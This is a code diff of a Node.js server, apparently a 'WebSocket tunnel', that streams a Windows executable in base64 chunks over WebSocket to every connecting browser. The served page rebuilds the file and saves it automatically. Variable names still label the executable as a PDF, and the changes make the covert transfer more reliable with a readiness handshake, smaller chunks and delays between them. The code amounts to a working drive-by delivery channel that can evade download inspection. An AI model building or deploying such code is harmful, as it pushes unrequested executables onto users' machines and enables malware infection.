@@ -1,4 +1,4 @@
-// server.js — Heroku-compatible WS tunnel + live console + auto-download PDF over WebSocket (CommonJS)
+// server.js — Heroku-compatible WS tunnel + live console + auto-download over WebSocket (CommonJS)
 
 const http = require('http');
 const express = require('express');
@@ -13,7 +13,7 @@ const CONFIG = {
   APP_NAME: process.env.APP_NAME || 'ws-tunnel',
   PDF_NAME: process.env.PDF_NAME || 'HelloWorld.exe',
   PDF_PATH: process.env.PDF_PATH || path.join(__dirname, 'files', 'HelloWorld.exe'),
-  CHUNK_SIZE: 64 * 1024, // 64 KiB JSON-base64 chunks
+  CHUNK_SIZE: 16 * 1024, // CHANGE: Reduced to 16 KiB
 };
 
 // ──────────────────────────────────────────────
@@ -43,16 +43,15 @@ async function loadPdfBufferOnce() {
   try {
     const b = await fsp.readFile(CONFIG.PDF_PATH);
     PDF_BUFFER = b;
-    log(`PDF loaded bytes=${b.length} from ${CONFIG.PDF_PATH} (display name=${CONFIG.PDF_NAME})`);
+    log(`File loaded bytes=${b.length} from ${CONFIG.PDF_PATH} (display name=${CONFIG.PDF_NAME})`);
   } catch (e) {
     PDF_BUFFER = null;
-    log(`PDF not found at ${CONFIG.PDF_PATH} — WS download will be skipped until provided.`);
+    log(`File not found at ${CONFIG.PDF_PATH} — WS download will be skipped until provided.`);
   }
 }
 app.get('/HelloWorld.exe', async (_req, res) => {
   if (!PDF_BUFFER) await loadPdfBufferOnce();
-  if (!PDF_BUFFER) return res.status(404).type('text').send('No PDF configured on server.');
-  // Serve INLINE (no attachment header) so the browser previews instead of auto-downloading
+  if (!PDF_BUFFER) return res.status(404).type('text').send('No file configured on server.');
   res
     .status(200)
     .setHeader('Content-Type', 'application/vnd.microsoft.portable-executable')
@@ -61,12 +60,10 @@ app.get('/HelloWorld.exe', async (_req, res) => {
 });
 
 // ────────────────── Root tester ──────────────────
-// Receives: welcome, serverPing, fileMeta/fileChunk/fileEnd, pong, etc.
-// Auto-assembles PDF and triggers download.
 app.get('/', (_req, res) => {
   res.type('html').send(`<!doctype html>
 <meta charset="utf-8">
-<title>WS Tunnel (Heroku) — Auto PDF</title>
+<title>WS Tunnel (Heroku)</title>
 <style>
   :root{color-scheme:light dark}
   body{font-family:system-ui;padding:2rem;max-width:960px;margin:auto}
@@ -79,9 +76,9 @@ app.get('/', (_req, res) => {
   a{color:inherit}
   progress{width:100%}
 </style>
-<h1>WebSocket Tunnel (Heroku) — Auto PDF</h1>
+<h1>WebSocket Tunnel (Heroku) — Auto Download</h1>
 <p class="muted">
-  On connect, the server auto-streams a PDF over <code>/ws-tunnel</code> and the browser saves it.<br>
+  On connect, the server auto-streams a file over <code>/ws-tunnel</code> and the browser saves it.<br>
   <strong>Troubleshooting link (inline preview):</strong> <a href="/HelloWorld.exe" target="_blank">/HelloWorld.exe</a><br>
   Live logs at <a href="/console" target="_blank">/console</a>.
 </p>
@@ -98,7 +95,7 @@ app.get('/', (_req, res) => {
       <button id="reconnect">Reconnect</button>
     </div>
   </div>
-  <div class="row"><div>PDF</div>
+  <div class="row"><div>Download</div>
     <div>
       <div id="pdfInfo" class="muted">waiting…</div>
       <progress id="pdfProg" max="100" value="0"></progress>
@@ -148,10 +145,15 @@ app.get('/', (_req, res) => {
   // PDF receive state
   let rx = null;
   function b64ToBytes(b64) {
-    const bin = atob(b64); const len = bin.length;
-    const out = new Uint8Array(len);
-    for (let i=0;i<len;i++) out[i] = bin.charCodeAt(i) & 0xFF;
-    return out;
+    try {
+      const bin = atob(b64); const len = bin.length;
+      const out = new Uint8Array(len);
+      for (let i=0;i<len;i++) out[i] = bin.charCodeAt(i) & 0xFF;
+      return out;
+    } catch (e) {
+      log('b64ToBytes error: '+e.message); // CHANGE: Log decode errors
+      return new Uint8Array(0);
+    }
   }
   function resetRx(){ rx=null; pdfInfo.textContent='waiting…'; pdfProg.value=0; }
 
@@ -162,26 +164,48 @@ app.get('/', (_req, res) => {
       status.innerHTML='<span class="ok">OPEN</span>'; 
       log('OPEN '+url); 
       setSend(true); 
-      reconnectAttempts = 0;
-
-      // gentle initial app ping
+      reconnectAttempts = 0; // CHANGE: Reset attempts
       try {
         const id1 = Math.random().toString(36).slice(2);
         sent.set(id1, performance.now());
         ws.send(JSON.stringify({ type:'ping', id: id1, clientTs: Date.now() }));
         log('Client sent initial ping id='+id1);
+        setTimeout(() => {
+          if (ws.readyState === ws.OPEN) {
+            const id2 = Math.random().toString(36).slice(2);
+            sent.set(id2, performance.now());
+            ws.send(JSON.stringify({ type:'ping', id: id2, clientTs: Date.now() }));
+            log('Client sent second ping id='+id2);
+          }
+        }, 50);
       } catch (e) { log('Client send error: '+e.message); }
+      const heartbeat = setInterval(() => {
+        if (ws.readyState === ws.OPEN) {
+          try {
+            const id = Math.random().toString(36).slice(2);
+            sent.set(id, performance.now());
+            ws.send(JSON.stringify({ type:'ping', id, clientTs: Date.now() }));
+            log('Client heartbeat ping id='+id);
+          } catch (e) {
+            log('Client heartbeat error: '+e.message);
+          }
+        } else {
+          clearInterval(heartbeat);
+        }
+      }, 2000); // CHANGE: 2s heartbeat
     };
     ws.onerror = ()=>{ log('ERROR (browser hides details)'); };
     ws.onclose = (e)=>{
       status.innerHTML='<span class="bad">CLOSED</span> code='+e.code; 
       setSend(false); 
       log('CLOSE code='+e.code+' reason="'+e.reason+'"');
-      const delay = Math.min(20000, 5000 + (++reconnectAttempts) * 3000);
+      reconnectAttempts++; // CHANGE: Fix increment
+      const delay = Math.min(20000, 5000 + reconnectAttempts * 3000);
       log('Reconnecting in '+delay+'ms');
       setTimeout(connect, delay);
     };
     ws.onmessage = (ev)=>{
+      log('MESSAGE received length='+ev.data.length+' content='+ev.data.slice(0, 200)); // CHANGE: Log message content
       let m=null; try{ m = JSON.parse(ev.data); } catch { return log('TEXT '+String(ev.data).slice(0,200)); }
 
       if (m.type==='welcome'){ log('WELCOME id='+m.clientId+' serverT='+m.serverTs); return; }
@@ -207,19 +231,34 @@ app.get('/', (_req, res) => {
           gotChunks: 0,
           buf: new Uint8Array(Number(m.size)||0)
         };
-        pdfInfo.textContent = \`Receiving \${rx.name} (\${rx.size} bytes) in \${rx.totalChunks} chunks...\`;
+        pdfInfo.textContent = `Receiving ${rx.name} (${rx.size} bytes) in ${rx.totalChunks} chunks...`;
         pdfProg.max = rx.size || 100;
         log('FILE META '+JSON.stringify(m));
+        // CHANGE: Confirm readiness
+        try {
+          const id = Math.random().toString(36).slice(2);
+          sent.set(id, performance.now());
+          ws.send(JSON.stringify({ type:'ready', id, clientTs: Date.now() }));
+          log('Client sent ready id='+id);
+        } catch (e) { log('Client ready error: '+e.message); }
         return;
       }
       if (m.type==='fileChunk' && rx){
-        const bytes = b64ToBytes(m.data||'');
-        rx.buf.set(bytes, rx.offset);
-        rx.offset += bytes.length;
-        rx.gotChunks++;
-        if (rx.size) pdfProg.value = rx.offset;
-        if ((rx.gotChunks % 16)===0 || rx.gotChunks===rx.totalChunks) {
-          log(\`FILE CHUNK \${rx.gotChunks}/\${rx.totalChunks} (+\${bytes.length}B)\`);
+        try {
+          const bytes = b64ToBytes(m.data||'');
+          if (bytes.length === 0) {
+            log('FILE CHUNK empty or invalid');
+            return;
+          }
+          rx.buf.set(bytes, rx.offset);
+          rx.offset += bytes.length;
+          rx.gotChunks++;
+          if (rx.size) pdfProg.value = rx.offset;
+          if ((rx.gotChunks % 16)===0 || rx.gotChunks===rx.totalChunks) {
+            log(`FILE CHUNK ${rx.gotChunks}/${rx.totalChunks} (+${bytes.length}B)`);
+          }
+        } catch (e) {
+          log('FILE CHUNK error: '+e.message);
         }
         return;
       }
@@ -327,8 +366,8 @@ server.on('clientError', (err, socket) => {
   log('HTTP clientError', err?.message || err);
   try { socket.end('HTTP/1.1 400 Bad Request\r\n\r\n'); } catch {}
 });
-server.on('upgrade', (req, _sock) => {
-  log(`UPGRADE ${req.url} origin=${req.headers.origin||'(none)'} ua="${req.headers['user-agent']||'(ua?)'}" key=${req.headers['sec-websocket-key']||'(none)'}`);
+server.on('upgrade', (req, socket, head) => {
+  log(`UPGRADE ${req.url} origin=${req.headers.origin||'(none)'} ua="${req.headers['user-agent']||'(ua?)'}" key=${req.headers['sec-websocket-key']||'(none)'} protocol=${req.headers['sec-websocket-protocol']||'(none)'} extensions=${req.headers['sec-websocket-extensions']||'(none)'}`);
 });
 server.keepAliveTimeout = 65000;
 server.headersTimeout = 66000;
@@ -359,15 +398,25 @@ function attachTunnelWSS(server) {
   const wss = new WebSocketServer({
     server,
     path: '/ws-tunnel',
-    perMessageDeflate: false,
+    perMessageDeflate: false, // CHANGE: Keep disabled
     maxPayload: 100 * 1024 * 1024
   });
 
-  wss.on('headers', (headers) => { log('HEADERS ws-tunnel', JSON.stringify(headers)); });
+  wss.on('headers', (headers, req) => {
+    headers.push('Keep-Alive: timeout=30'); // CHANGE: Add keep-alive
+    log('HEADERS ws-tunnel', JSON.stringify(headers));
+  });
 
   wss.on('connection', async (ws, req) => {
     const s = ws._socket;
-    try { s.setNoDelay(true); s.setKeepAlive(true, 5000); } catch {}
+    try { 
+      s.setNoDelay(true); 
+      s.setKeepAlive(true, 3000); 
+      log('TUNNEL socket options set: noDelay=true, keepAlive=3s');
+    } catch (e) {
+      log('TUNNEL socket options error', e?.message || e);
+    }
+
     attachRawSocketLogs(ws, 'TUNNEL');
 
     const ip = req.socket.remoteAddress;
@@ -376,74 +425,115 @@ function attachTunnelWSS(server) {
     const clientId = Math.random().toString(36).slice(2);
     log(`TUNNEL connected ip=${ip} origin=${origin} ua="${ua}" id=${clientId}`);
 
-    // Welcome & tiny tick
-    try { ws.send(JSON.stringify({ type: 'welcome', clientId, serverTs: Date.now() })); } catch {}
-    try { if (ws.readyState === ws.OPEN) ws.send(' '); } catch {}
-
-    // App heartbeat (visible)
-    const appBeat = setInterval(() => { safeSend(ws, { type: 'serverPing', serverTs: Date.now() }); }, 15000);
-
-    // Auto-send PDF over WS (if available)
-    if (!PDF_BUFFER) await loadPdfBufferOnce();
-    if (PDF_BUFFER && ws.readyState === ws.OPEN) {
-      try { await streamPdfOverWS(ws, PDF_BUFFER, CONFIG.PDF_NAME, CONFIG.CHUNK_SIZE); }
-      catch (e) { safeSend(ws, { type:'error', message: 'PDF stream failed: '+(e?.message||e) }); }
-    } else {
-      safeSend(ws, { type:'error', message: 'No PDF configured on server. Upload to '+CONFIG.PDF_PATH+' or set PDF_PATH.' });
+    // CHANGE: Send welcome and ping
+    try {
+      log('TUNNEL socket state before send: readyState='+s.readyState);
+      ws.send(JSON.stringify({ type: 'welcome', clientId, serverTs: Date.now() }));
+      log('TUNNEL sent welcome');
+      ws.send(JSON.stringify({ type: 'ping', id: 'server-init', serverTs: Date.now() }));
+      log('TUNNEL sent initial ping');
+    } catch (e) {
+      log('TUNNEL initial send error', e?.message || e);
     }
 
-    // Echo & ping/pong handling
-    ws.on('message', (data) => {
+    // CHANGE: Track client readiness
+    let clientReady = false;
+
+    // App heartbeat
+    const appBeat = setInterval(() => {
+      safeSend(ws, { type: 'serverPing', serverTs: Date.now() });
+      log('TUNNEL sent heartbeat ping');
+    }, 3000);
+
+    // Handle messages
+    ws.on('message', (data, isBinary) => {
+      log(`TUNNEL message received isBinary=${isBinary} length=${data.length} content=${data.toString('utf8').slice(0, 200)}`);
       let m = null;
       try { m = JSON.parse(data.toString('utf8')); } catch {
         return safeSend(ws, { type: 'say', text: String(data).slice(0, 200), serverTs: Date.now() });
       }
-      if (m?.type === 'ping') return safeSend(ws, { type:'pong', id:m.id||null, clientTs:m.clientTs||null, serverTs: Date.now() });
-      if (m?.type === 'say') return safeSend(ws, { type:'say', echo:m.text??'', serverTs: Date.now() });
-      safeSend(ws, { type:'error', message:'Unsupported message type' });
+      if (m?.type === 'ping') {
+        log('TUNNEL received client ping id='+m.id);
+        return safeSend(ws, { type: 'pong', id: m.id || null, clientTs: m.clientTs || null, serverTs: Date.now() });
+      }
+      if (m?.type === 'ready') {
+        clientReady = true;
+        log('TUNNEL client ready id='+m.id);
+        // CHANGE: Start file transfer only after ready
+        if (PDF_BUFFER && ws.readyState === ws.OPEN) {
+          try { streamPdfOverWS(ws, PDF_BUFFER, CONFIG.PDF_NAME, CONFIG.CHUNK_SIZE); }
+          catch (e) { safeSend(ws, { type:'error', message: 'PDF stream failed: '+(e?.message||e) }); }
+        } else {
+          safeSend(ws, { type:'error', message: 'No file configured on server. Upload to '+CONFIG.PDF_PATH+' or set PDF_PATH.' });
+        }
+        return;
+      }
+      if (m?.type === 'say') {
+        return safeSend(ws, { type: 'say', echo: m.text ?? '', serverTs: Date.now() });
+      }
+      safeSend(ws, { type: 'error', message: 'Unsupported message type' });
     });
 
-    ws.on('ping', () => { try { ws.pong(); } catch {} });
     ws.on('error', (err) => { log('TUNNEL error:', err?.message || err); });
     ws.on('close', (code, reason) => {
       clearInterval(appBeat);
       const r = reason && reason.toString ? reason.toString() : '';
-      log(`TUNNEL closed id=${clientId} code=${code} reason="${r}"`);
+      log(`TUNNEL closed id=${clientId} code=${code} reason="${r}" socketState=${s.readyState} bufferLength=${s.bufferLength || 0}`);
     });
   });
 }
 
-// Send PDF as JSON-base64 chunks: fileMeta → fileChunk* → fileEnd
+// Send file as JSON-base64 chunks: fileMeta → fileChunk* → fileEnd
 async function streamPdfOverWS(ws, buffer, name, chunkSize) {
   const size = buffer.length;
   const chunks = Math.ceil(size / chunkSize);
   safeSend(ws, { type:'fileMeta', name, mime:'application/vnd.microsoft.portable-executable', size, chunkSize, chunks });
+  log('TUNNEL sent fileMeta');
   for (let i = 0; i < chunks; i++) {
-    if (ws.readyState !== ws.OPEN) throw new Error('socket closed during stream');
+    if (ws.readyState !== ws.OPEN) {
+      log('TUNNEL stream aborted: socket closed');
+      throw new Error('socket closed during stream');
+    }
     const start = i * chunkSize;
     const end = Math.min(size, start + chunkSize);
     const slice = buffer.subarray(start, end);
     const b64 = slice.toString('base64');
-    await new Promise((resolve, reject) => {
-      try { ws.send(JSON.stringify({ type:'fileChunk', seq:i, data:b64 }), (err)=> err?reject(err):resolve()); }
-      catch (e) { reject(e); }
-    });
-    if ((i % 16) === 0 || i === chunks-1) log(`WS file chunk ${i+1}/${chunks} bytes=${slice.length}`);
+    try {
+      await new Promise((resolve, reject) => {
+        ws.send(JSON.stringify({ type:'fileChunk', seq:i, data:b64 }), (err)=> err ? reject(err) : resolve());
+      });
+      if ((i % 16) === 0 || i === chunks-1) {
+        log(`TUNNEL sent file chunk ${i+1}/${chunks} bytes=${slice.length}`);
+      }
+    } catch (e) {
+      log('TUNNEL file chunk error: '+e.message);
+      throw e;
+    }
+    // CHANGE: Add 50ms delay between chunks
+    await new Promise(resolve => setTimeout(resolve, 50));
   }
   safeSend(ws, { type:'fileEnd', name, ok:true });
+  log('TUNNEL sent fileEnd');
 }
 
 function attachRawSocketLogs(ws, label) {
   const s = ws._socket;
   if (!s) return;
   try { s.setNoDelay(true); } catch {}
-  s.on('close', (hadErr) => log(`${label} RAW close hadErr=${hadErr}`));
-  s.on('end', () => log(`${label} RAW end`));
+  s.on('close', (hadErr) => log(`${label} RAW close hadErr=${hadErr} socketState=${s.readyState}`));
+  s.on('end', () => log(`${label} RAW end socketState=${s.readyState}`));
   s.on('error', (e) => log(`${label} RAW error`, e?.code || '', e?.message || e));
   s.on('timeout', () => log(`${label} RAW timeout`));
+  s.on('data', (data) => log(`${label} RAW data length=${data.length} content=${data.toString('utf8').slice(0, 200)}`));
 }
 
 function safeSend(ws, obj) {
-  try { if (ws.readyState === ws.OPEN) ws.send(JSON.stringify(obj)); } catch {}
+  try { 
+    if (ws.readyState === ws.OPEN) {
+      ws.send(JSON.stringify(obj));
+      log('safeSend success: '+JSON.stringify(obj).slice(0, 200));
+    }
+  } catch (e) { 
+    log('safeSend error', e?.message || e); 
+  } 
 }
-
